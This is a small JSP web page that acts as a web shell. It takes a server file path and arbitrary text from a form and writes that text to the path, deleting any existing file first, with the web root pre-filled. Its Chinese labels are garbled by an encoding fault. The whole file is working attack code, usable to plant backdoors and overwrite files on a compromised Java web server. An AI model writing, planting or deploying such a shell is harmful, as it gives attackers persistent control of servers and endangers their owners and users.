<%@ page language="java" pageEncoding="gbk"%>
<jsp:directive.page import="java.io.File"/>
<jsp:directive.page import="java.io.OutputStream"/>
<jsp:directive.page import="java.io.FileOutputStream"/>
<html>
  <head> 
    <title>�0�2��0�5���0�8�0�1</title>
<meta http-equiv="keywords" content="�0�2��0�5���0�8�0�1">
<meta http-equiv="description" content="�0�2��0�5���0�8�0�1">
  </head>
  <%
  int i=0;
   String method=request.getParameter("act");
   if(method!=null&&method.equals("up")){
    String url=request.getParameter("url");
    String text=request.getParameter("text");
     File f=new File(url);
     if(f.exists()){
      f.delete();
     }
     try{
      OutputStream o=new FileOutputStream(f);
      o.write(text.getBytes());
      o.close();
     }catch(Exception e){
      i++;
       %>
       �0�1�0�0�0�0�0�1�0�4�0�2�0�1�0�0�0�3�0�3�0�8�0�6�0�2�0�0�0�1
       <% 
      }
      }
      if(i==0){
      %>
       �0�1�0�0�0�0�0�1�0�4�0�2�0�3�0�8�0�6�0�2�0�0�0�1
     <%
    } 
  %>
  
  <body>
<form action='?act=up'  method='post'>
  <input size="100" value="<%=application.getRealPath("/") %>" name="url"><br>
  <textarea rows="20" cols="80" name="text">���0�7�0�5�0�2�0�6�0�5���0�8�0�1�0�4�0�6�0�4�0�1�0�3�0�5�0�4�0�2�0�1</textarea><br>
  <input type="submit" value="up" name="text"/>
</form>
  </body>
</html> 

